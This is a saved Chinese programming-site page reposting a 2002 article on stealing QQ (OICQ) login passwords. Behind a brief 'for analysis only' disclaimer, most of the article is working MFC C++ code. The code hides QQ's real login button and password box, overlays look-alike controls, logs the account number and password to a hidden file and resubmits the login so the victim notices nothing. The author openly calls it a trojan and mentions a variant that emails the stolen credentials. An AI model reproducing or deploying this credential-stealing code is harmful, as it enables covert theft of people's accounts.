<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.0 Transitional//EN">
<!-- saved from url=(0041)http://tzsvc.xiloo.com/doc/files/oicq.htm -->
<HTML><HEAD><TITLE>宗胜的编程乐园--文档 <http://tzsvc.xiloo.com></TITLE><!-- #BeginTemplate "/Templates/index3_old.dwt" --><!-- #BeginEditable "doctitle" --><!-- #EndEditable -->
<META http-equiv=Content-Type content="text/html; charset=gb2312">
<STYLE type=text/css>A {
	COLOR: #000000; TEXT-DECORATION: none
}
A:hover {
	TEXT-DECORATION: underline
}
</STYLE>

<SCRIPT language=JAVASCRIPT>
<!-- 
var timerID = null;
var timerRunning = false;
function stopclock (){
if(timerRunning)
clearTimeout(timerID);
timerRunning = false;
}
function showtime () {
var now = new Date();
var hours = now.getHours();
var minutes = now.getMinutes();
var seconds = now.getSeconds()
var timeValue = "现在时间是: " + ((hours >12) ? hours -12 :hours)
timeValue += ((minutes < 10) ? ":0" : ":") + minutes
timeValue += ((seconds < 10) ? ":0" : ":") + seconds
timeValue += (hours >= 12) ? " P.M." : " A.M."
window.status = timeValue;
timerID = setTimeout("showtime()",1000);
timerRunning = true;
}
function startclock () {
stopclock();
showtime();
}
-->
</SCRIPT>

<SCRIPT language=JavaScript>
<!--
function MM_reloadPage(init) {  //reloads the window if Nav4 resized
  if (init==true) with (navigator) {if ((appName=="Netscape")&&(parseInt(appVersion)==4)) {
    document.MM_pgW=innerWidth; document.MM_pgH=innerHeight; onresize=MM_reloadPage; }}
  else if (innerWidth!=document.MM_pgW || innerHeight!=document.MM_pgH) location.reload();
}
MM_reloadPage(true);
// -->
</SCRIPT>

<META content="MSHTML 5.50.4134.100" name=GENERATOR></HEAD>
<BODY text=#000000 bgColor=#ffffff leftMargin=0 onload=startclock()>
<TABLE cellSpacing=0 cellPadding=0 width=772 border=0>
  <TBODY>
  <TR>
    <TD vAlign=top align=left bgColor=#ffffff>
      <TABLE height=8 cellSpacing=0 cellPadding=0 width=776 align=center 
      border=0>
        <TBODY>
        <TR>
          <TD width=311 bgColor=#ffffff height=11><FONT color=#ffffff>　
            <SCRIPT language=JavaScript> <!---
today=new Date();
var hours = today.getHours();
var minutes = today.getMinutes();
var seconds = today.getSeconds();
var timeValue = "<FONT COLOR=black>" + ((hours >12) ? hours -12 :hours); timeValue += ((minutes < 10) ? "<BLINK><FONT COLOR=black>:</FONT></BLINK>0" : "<BLINK><FONT COLOR=black>:</FONT></BLINK>") + minutes+"</FONT></FONT>";
timeValue += (hours >= 12) ? "<FONT COLOR=blue><I><B>pm</B></I></FONT>" : "<FONT COLOR=blue><B><I>am</I></B></FONT>";
function initArray(){
this.length=initArray.arguments.length
for(var i=0;i<this.length;i++)
this[i+1]=initArray.arguments[i] }
var d=new initArray("<font color=RED>星期日","<font color=black>星期一","<font color=black>星期二","<font color=black>星期三","<font color=black>星期四","<font color=black>星期五","<font color=GREEN>星期六"); document.write("<font color=black>",today.getYear(),"<font color=red>年","<font color=black>",today.getMonth()+1,"<font color=red>月","<font color=black>",today.getDate(),"<font color=red>日 </FONT>",d[today.getDay()+1]," ",timeValue); //--></SCRIPT>
             <FONT color=#000000 size=2>登录</FONT></FONT></TD>
          <TD vAlign=bottom align=right width=51 bgColor=#ffffff height=11><A 
            href="http://tzsvc.xiloo.com/index.htm"><IMG height=17 
            src="偷梁换柱盗取OICQ密码.files/head.jpg" width=51 border=0></A></TD>
          <TD vAlign=bottom align=middle width=36 bgColor=#e8ecf8 height=11><A 
            href="http://tzsvc.xiloo.com/mywriting/mywriting.htm"><FONT 
            color=#000000 size=2>作品</FONT></A></TD>
          <TD vAlign=bottom align=middle width=36 bgColor=#e8ecf8 
            height=11><FONT color=#000000 size=2><A 
            href="http://tzsvc.xiloo.com/firststu/firststu.htm">新手</A></FONT></TD>
          <TD vAlign=bottom align=middle width=36 bgColor=#e8ecf8 height=11><A 
            href="http://tzsvc.xiloo.com/doc/doc.htm"><FONT color=#000000 
            size=2>文章</FONT></A></TD>
          <TD vAlign=bottom align=middle width=36 bgColor=#e8ecf8 height=11><A 
            href="http://tzsvc.xiloo.com/skill/dll.htm"><FONT color=#000000 
            size=2>技巧</FONT></A></TD>
          <TD vAlign=bottom align=middle width=36 bgColor=#e8ecf8 height=11><A 
            href="http://tzsvc.xiloo.com/book/vc.htm"><FONT color=#000000 
            size=2>教程</FONT></A></TD>
          <TD vAlign=bottom align=middle width=36 bgColor=#e8ecf8 height=11><A 
            href="http://tzsvc.xiloo.com/code/code.htm"><FONT color=#000000 
            size=2>源码</FONT></A></TD>
          <TD vAlign=bottom align=middle width=36 bgColor=#e8ecf8 height=11><A 
            href="http://tzsvc.xiloo.com/ks/ks.htm"><FONT color=#000000 
            size=2>考试</FONT></A></TD>
          <TD vAlign=bottom align=middle width=36 bgColor=#e8ecf8 height=11><A 
            href="http://tzsvc.xiloo.com/job/job.htm"><FONT color=#000000 
            size=2>求职</FONT></A></TD>
          <TD vAlign=bottom align=middle width=36 bgColor=#e8ecf8 height=11><A 
            href="http://tzsvc.xiloo.com/download/download.htm"><FONT 
            color=#000000 size=2>下载</FONT></A></TD>
          <TD vAlign=bottom align=middle width=36 bgColor=#e8ecf8 height=11><A 
            href="http://tzsvc.xiloo.com/virus/virus.htm"><FONT color=#000000 
            size=2>病毒</FONT></A></TD>
          <TD vAlign=bottom align=left width=56 bgColor=#e8ecf8 height=11><A 
            href="http://tzsvc.xiloo.com/programmer/programmer.htm"><FONT 
            color=#000000 size=2>人生</FONT></A></TD></TR></TBODY></TABLE></TD></TR>
  <TR>
    <TD vAlign=top align=left bgColor=#0070b0></TD></TR>
  <TR vAlign=bottom align=left>
    <TD>
      <TABLE cellSpacing=0 cellPadding=0 width=761 align=center border=0>
        <TBODY>
        <TR>
          <TD width=188 height=49><IMG height=67 src="" width=187></TD>
          <TD width=452 height=49><A 
            href="http://asiafriendfinder.com/go/f122344"><IMG height=67 src="" 
            width=450 align=absBottom border=0></A></TD>
          <TD width=121 height=49><FONT size=2><IFRAME border=0 
            src="偷梁换柱盗取OICQ密码.files/showlink.htm" frameBorder=0 width=120 
            scrolling=no height=60></IFRAME></FONT></TD></TR></TBODY></TABLE></TD></TR>
  <TR bgColor=#0070b0>
    <TD><FONT color=#ffffff size=2><FONT size=2>　|<A target=_blank 
      href="http://www.sn163.net/cgi-bin/bbs3000/bbs.cgi?id=200205011106"><FONT 
      color=#ffffff size=2>编程论坛</FONT></A>|<A target=_blank 
      href="http://www.sn163.net/cgi-bin/gb2000/gb.cgi?id=tangzs"><FONT 
      color=#ffffff size=2>请您留言</FONT></A>|</FONT><A target=_blank 
      href="mailto:tzs168@yahoo.com.cn"><FONT color=#ffffff 
      size=2>联系我们</FONT></A>|</FONT></TD></TR>
  <TR>
    <TD vAlign=top align=left>
      <TABLE cellSpacing=0 cellPadding=0 width=777 border=0>
        <TBODY>
        <TR>
          <TD vAlign=top align=middle width=165 bgColor=#e8ecf8 
            height=104><IMG height=60 src="" width=140><BR><BR><FONT size=2><A 
            href="http://tzsvc.xiloo.com/other/new.htm">本站更新列表&gt;&gt;</A></FONT><BR><BR><FONT 
            size=2><A 
            href="http://tzsvc.xiloo.com/other/goodpage.htm">好站链接&gt;&gt;</A></FONT><BR></TD>
          <TD vAlign=top align=left width=12 height=104><IMG height=15 
            src="偷梁换柱盗取OICQ密码.files/mid_conner.gif" width=10></TD>
          <TD vAlign=top align=left width=600 height=104><!-- #BeginEditable "data" -->
            <TABLE height=64 cellSpacing=0 cellPadding=0 width=599 border=0>
              <TBODY>
              <TR>
                <TD><FONT 
                  size=2>日期:2002/5/1　　　　　　　　　　　　　　　　　　　　　　　　文章出处:vcbase</FONT></TD></TR>
              <TR>
                <TD><FONT size=2>标题:</FONT><FONT class=content><FONT 
                  color=#000000 size=2><B>偷梁换柱盗取OICQ密码</B></FONT></FONT> 　<FONT 
                  size=2>作者:<FONT class=content>何建敏</FONT></FONT></TD></TR>
              <TR>
                <TD>&nbsp;</TD></TR>
              <TR>
                <TD vAlign=top align=left>
                  <P><FONT class=content><FONT size=2>申明：本文旨在分析黑客攻击的手段，请勿用于非法目的！ 
                  </FONT></FONT></P>
                  <P><FONT 
                  size=2>Internet的发展，带动了IT界的一次大飞跃，黑客的活动也随之日益猖獗，攻击手法不断变化。各种黑客程序也是层出不穷，木马程序更是花样百出。如：监视键盘按键、替换登录程序等，现在我就来介绍另一种攻击手法，替换登录程序按钮。这招绝吧!现在我就来将方法介绍一下。<BR>就拿我们很熟悉的OICQ来作一个例子，看看程序到底是如何实现偷梁换柱的。要替换OICQ的登录程序的按钮与密码框，首先就得捕获OICQ登录程序的登录按钮和密码框句柄。哈哈，要是换上了我们自己的按钮与密码框，不就是想干什么就干什么了吗。</FONT></P>
                  <P><FONT 
                  size=2><BR>　我们要取得4个CWnd句柄，分另是：用户号码的CComBox、用户口令CEdit、登录按扭CButton、主对话框句柄。</FONT></P>
                  <P><FONT 
                  size=2>m_hOicq=FindWindow(NULL,"QQ用户登录");<BR>m_hOk=CWnd::FromHandle(FindWindowEx(m_hOicq-&gt;GetSafeHwnd(),NULL,"BUTTON","登录"));<BR>m_hEdit=CWnd::FromHandle(FindWindowEx(m_hOicq-&gt;GetSafeHwnd(),NULL,"EDIT",NULL));<BR>m_hCom=CWnd::FromHandle(FindWindowEx(m_hOicq-&gt;GetSafeHwnd(),NULL,"ComboBox",NULL));<BR>///上面的m_hOicq,m_hOk,m_hEdit,m_hCom分别为CWnd 
                  *类型 <BR>有了这四个句柄，接下来的事就好办多了，那现在我们就直接生成一个按扭和一个编辑框吧。代码如下 CFont 
                  *m_font=m_hOk-&gt;GetFont();<BR>CFont 
                  *m_font1=m_hEdit-&gt;GetFont();<BR>CRect rect;<BR>CRect 
                  rect1;<BR>m_hOk-&gt;GetWindowRect(rect);<BR>m_hOk-&gt;ScreenToClient(rect);<BR>m_hEdit-&gt;GetWindowRect(rect1);<BR>m_hEdit-&gt;ScreenToClient(rect1);<BR>rect.left+=14;<BR>rect.top+=117;<BR>rect.bottom+=117;<BR>rect.right+=14;<BR>rect1.left+=110;<BR>rect1.top+=56;<BR>rect1.bottom+=56;<BR>rect1.right+=110;<BR>m_hOk-&gt;ShowWindow(SW_HIDE);//隐藏登录按钮<BR>m_hEdit-&gt;ShowWindow(SW_HIDE);//银藏密码框<BR>if(m_button.Create("登录",WS_CHILD|WS_VISIBLE|WS_TABSTOP|BS_DEFPUSHBUTTON,rect,m_hOicq,IDC_STARTBUTTON)==FALSE)<BR>MessageBox("error");<BR>m_button.SetFont(m_font,TRUE);<BR>m_button.SetWnd(this);<BR>m_button.SetID(IDC_STARTBUTTON);<BR>if(m_edit.CreateEx(0x204,"Edit","",0x500100A0,rect1,m_hOicq,IDC_MYEDIT)==FALSE)<BR>MessageBox("error1");<BR>m_edit.SetFont(m_font1,TRUE);<BR>m_edit.SetFocus();<BR>m_edit.SetWnd(this);</FONT></P>
                  <P><FONT 
                  size=2>上面代码中的m_button为CMyButton类型变量，m_edit为CMyEdit类型变量，请继续往下看。</FONT></P>
                  <P><FONT 
                  size=2>这两个控件生成了!但是光生成两个控件还没用，我们得让两个控件告诉我们什么时候按了回车，什么时候点击了Mouse左键。那就得对EDIT、BUTTON做一下处理才行。用ClassWinzard生成二个派生类CMyEdit、CMyButton，分别生成WM_LBUTTONUP、PreTranslateMessage，让它处理相应的按键事件。并通讯事件发个消息给我的主对话框，那就要取得我的对话框的句柄，在两个派生类中分别生成函数<BR>SetWnd(CWnd 
                  *pWnd)用于告知主对话框的窗口句柄。<BR>在CMyEdit的 PreTranslateMessage(MSG* 
                  pMsg)中输入 
                  <BR>if(pMsg-&gt;message==WM_KEYDOWN)<BR>{<BR>if(pMsg-&gt;wParam==VK_RETURN)<BR>m_wnd-&gt;SendMessage(WM_ButtonDown,0,0);<BR>}</FONT></P>
                  <P><FONT size=2><BR>在CMyButton的OnLButtonUp(UINT nFlags, CPoint 
                  point)中输入</FONT></P>
                  <P><FONT 
                  size=2>m_wnd-&gt;SendMessage(WM_ButtonDown,0,0);</FONT></P>
                  <P><FONT 
                  size=2>以上将一个消息发送到我的对话框，我得把消息处里一下，做的干净漂亮些，这样用的人才不会知道我个木马程序在偷偷监视他们 
                  <BR>CString Password,cc;<BR>char LoginName[20] 
                  ;<BR>memset(LoginName,0,20);<BR>::SendMessage(m_hCom-&gt;GetSafeHwnd(), 
                  WM_GETTEXT, 20, 
                  (LPARAM)LoginName);<BR>m_edit.GetWindowText(Password);<BR>m_edit.ShowWindow(SW_HIDE);<BR>m_hEdit-&gt;ShowWindow(SW_SHOW);<BR>m_hOk-&gt;ShowWindow(SW_SHOW);<BR>cc=0x0d;<BR>cc+=0x0a;<BR>CFileFind 
                  m_find;<BR>CFile 
                  m_file;<BR>if(!m_find.FindFile("c:\\oicqlog.dat"))<BR>m_file.Open("c:\\oicqlog.dat",CFile::modeCreate|CFile::modeWrite,NULL);<BR>else<BR>{<BR>m_file.Open("c:\\oicqlog.dat",CFile::modeWrite);<BR>m_file.SeekToEnd();<BR>}<BR>m_file.Write(cc,cc.GetLength());<BR>m_file.Write(LoginName,sizeof(LoginName));<BR>m_file.Write(cc,cc.GetLength());<BR>m_file.Write(Password,Password.GetLength());<BR>m_file.Close();<BR>m_hEdit-&gt;SetFocus();<BR>char 
                  *ee=Password.GetBuffer(Password.GetLength());<BR>::SendMessage(m_hEdit-&gt;GetSafeHwnd(),WM_SETTEXT,20,(LPARAM)ee);<BR>keybd_event(VK_RETURN,0,0,0);<BR>keybd_event(VK_RETURN,0,2,0); 
                  <BR>return TRUE;</FONT></P>
                  <P><FONT 
                  size=2><BR>好了，一个简单的木马程序就写完了，如果再加上Email的功能，那就变得更完美了，具体细节可以分析作者提供的源代码，该代码可以设定EMAIL信箱，SMTP服务器，一次发送数量，密码文件位置。<BR>示例程序的简单使用方法：按“捕获”按钮后程序被隐藏，当打开QQ时，QQ上的按钮已经被替换，登陆信息被记录在您所设置的密码文件中。请勿将此代码用于非法目的。</FONT></P>
                  <P></P>
                  <P><FONT class=content size=2>　</FONT></P></TD></TR>
              <TR>
                <TD align=middle><FONT size=2>上一页 第0页 下一页</FONT></TD></TR>
              <TR>
                <TD align=middle><FONT size=2><INPUT onclick=history.go(-1) type=button value=后退 name=button> 
<INPUT onclick=history.go(1) type=button value=前进 name=button2> 
<INPUT onclick=window.close() type=button value=关闭 name=button3> 
                  </FONT></TD></TR></TBODY></TABLE><!-- #EndEditable --></TD></TR></TBODY></TABLE></TD></TR></TBODY></TABLE>
<TABLE cellSpacing=0 cellPadding=0 width=764 align=center border=0>
  <TBODY>
  <TR>
    <TD>
      <HR SIZE=1>
    </TD></TR>
  <TR>
    <TD align=middle><FONT size=2>Copyright(C)2002 
      宗胜的编程乐园　http://tzsvc.xiloo.com <BR>文章版权归原作者所有，如仍有问题，请与我联系 </FONT></TD></TR>
  <TR>
    <TD>
      <HR SIZE=1>
    </TD></TR></TBODY></TABLE><!-- #EndTemplate --></BODY></HTML>
